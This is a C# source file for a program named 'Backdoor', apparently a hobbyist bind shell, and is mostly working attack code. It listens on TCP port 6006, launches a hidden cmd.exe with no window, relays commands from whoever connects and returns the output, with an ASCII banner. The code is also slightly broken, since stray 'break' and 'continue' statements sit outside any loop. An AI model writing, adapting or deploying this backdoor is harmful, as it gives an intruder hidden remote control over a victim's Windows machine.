﻿using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.IO;

namespace shepshellserv
{
    public class Backdoor
    {
        private TcpListener listener;
        private Socket mainSocket;
        private Process shell;
        private StreamReader fromShell;
        private StreamWriter toShell;
        private StreamReader inStream;
        private StreamWriter outStream;
        private Thread shellThread;

        public Backdoor() { startServer(); }

        public static void Main(String[] args)
        {
            Backdoor backdoor = new Backdoor();
        }

        public void startServer()
        {
            try
            {
                int port = 6006;

                    try
                    {
                        listener = new TcpListener(port);
                        listener.Start();
                        mainSocket = listener.AcceptSocket();
                        break;
                    }
                    catch (Exception) { continue; }

                Stream s = new NetworkStream(mainSocket);
                inStream = new StreamReader(s);
                outStream = new StreamWriter(s);
                outStream.AutoFlush = true;

                shell = new Process();
                shell.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                ProcessStartInfo p = new ProcessStartInfo("cmd");
                p.WindowStyle = ProcessWindowStyle.Hidden;
                p.CreateNoWindow = true;
                p.UseShellExecute = false;
                p.RedirectStandardError = true;
                p.RedirectStandardInput = true;
                p.RedirectStandardOutput = true;
                shell.StartInfo = p;
                shell.Start();
                toShell = shell.StandardInput;
                fromShell = shell.StandardOutput;
                toShell.AutoFlush = true;
                shellThread = new Thread(new ThreadStart(getShellInput));
                shellThread.Start();
                outStream.WriteLine(@"

 _____   _   _   _____  ______    ___   ______  ______   _   _____       ______   _____   _   _  ______ 
/  ___| | | | | |  ___| | ___ \  / _ \  | ___ \ |  _  \ ( ) /  ___|      | ___ \ |_   _| | \ | | |  _  \
\ `--.  | |_| | | |__   | |_/ / / /_\ \ | |_/ / | | | | |/  \ `--.       | |_/ /   | |   |  \| | | | | |
 `--. \ |  _  | |  __|  |  __/  |  _  | |    /  | | | |      `--. \      | ___ \   | |   | . ` | | | | |
/\__/ / | | | | | |___  | |     | | | | | |\ \  | |/ /      /\__/ /      | |_/ /  _| |_  | |\  | | |/ / 
\____/  \_| |_/ \____/  \_|     \_| |_/ \_| \_| |___/       \____/       \____/   \___/  \_| \_/ |___/  
                                                                                                        
% D3ADZO %                                                                                                        
");
                getInput();
                dropConnection();

            }
            catch (Exception) { dropConnection(); }
        }

        void getShellInput()
        {
            try
            {

                String tempBuf = "";
                outStream.WriteLine("\r\n");
                while ((tempBuf = fromShell.ReadLine()) != null)
                {
                    outStream.WriteLine(tempBuf + "\r");
                }
                dropConnection();
            }
            catch (Exception) { }
        }

        private void getInput()
        {
            try
            {
                String tempBuff = "";
                while (((tempBuff = inStream.ReadLine()) != null))
                { 
                    handleCommand(tempBuff);
                }
            }

            catch (Exception) { }
        }

        private void handleCommand(String com)
        {
            try
            {

                if (com.Equals("quit"))
                {
                    outStream.WriteLine("\n\nClosing the shell and Dropping the connection...");
                    dropConnection();
                }
                toShell.WriteLine(com + "\r\n");
                toShell.WriteLine("EOFX\r\n");
            }
            catch (Exception) { dropConnection(); }
        }


        private void dropConnection()
        {
            try
            {
                shell.Close();
                shell.Dispose();
                //shellThread.Abort();
                shellThread = null;
                inStream.Dispose();
                outStream.Dispose();
                toShell.Dispose();
                fromShell.Dispose();
                shell.Dispose();
                mainSocket.Close();
                listener.Stop();
                return;
            }
            catch (Exception) { }
        }

    }
}
